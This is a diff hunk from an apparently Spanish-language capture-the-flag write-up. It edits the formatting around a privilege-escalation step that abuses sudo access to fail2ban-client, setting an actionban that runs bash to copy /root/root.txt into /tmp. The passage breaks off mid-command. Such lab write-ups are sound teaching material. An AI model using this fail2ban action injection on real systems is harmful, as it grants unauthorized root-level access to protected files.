@@ -94,7 +94,9 @@ Antes de ejecutar los comandos para conseguir la flag de root se
 reiniciará el servicio de fail2ban para asegurarse de que no haya
 errores con el siguiente comando:
 
-//sudo /usr/bin/fail2ban-client restart//
+**sudo /usr/bin/fail2ban-client restart**
+
+Accion a realizar:
 
 sudo /usr/bin/fail2ban-client set sshd action iptables-multiport
 actionban \"/bin/bash -c \'cat /root/root.txt \> /tmp/root.txt && chmod
